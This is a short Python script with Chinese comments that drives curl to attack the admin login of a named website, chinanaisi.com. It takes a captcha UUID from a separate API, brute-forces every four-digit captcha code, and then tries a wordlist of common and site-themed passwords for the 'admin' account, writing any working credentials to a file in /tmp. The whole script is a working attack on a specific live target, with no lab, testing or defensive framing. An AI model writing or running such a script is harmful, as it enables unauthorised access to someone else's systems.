import subprocess, json, time

# 取captcha UUID
r=subprocess.run(['curl','-sk','--connect-timeout','10','https://api.myxypt.com/captcha?width=140&height=48','-c','/tmp/cf.txt','-b','/tmp/cf.txt'],capture_output=True,text=True,timeout=12)
d=json.loads(r.stdout); uid=d['data']['uuid']; print(f'UUID={uid}')

PWDS=['admin','123456','admin888','admin123','chinanaisi','naisi888','naisi123','admin2024','password','888888','000000','naisi','chinanaisi888']

# brute all 10000 codes
for i in range(10000):
    cv=f'{i:04d}'
    r2=subprocess.run(['curl','-sk','--connect-timeout','4','-L','http://chinanaisi.com/admin/login.php','-X','POST','-d',f'action=loginpost&uuid={uid}&loginId=&username=admin&password=admin&checkcode={cv}','-b','/tmp/cf.txt'],capture_output=True,text=True,timeout=6)
    body=r2.stdout
    if '后台登录' not in body and '验证码' not in body and len(body)>50:
        print(f'>>> CAPTCHA={cv} found!',flush=True)
        # 试所有密码
        for pw in PWDS:
            r3=subprocess.run(['curl','-sk','--connect-timeout','5','-L','http://chinanaisi.com/admin/login.php','-X','POST','-d',f'action=loginpost&uuid={uid}&loginId=&username=admin&password={pw}&checkcode={cv}','-b','/tmp/cf.txt'],capture_output=True,text=True,timeout=8)
            title=r3.stdout[:200]
            if '后台登录' not in title and '验证码错误' not in title:
                print(f'>>> PASSWORD={pw} RESULT={title[:100]}',flush=True)
                open('/tmp/CF_HIT.txt','w').write(f'user=admin pass={pw} code={cv}\n{r3.stdout[:1000]}')
        break
    if i%500==0: print(f'[{i}/10000]',flush=True)
print('DONE')
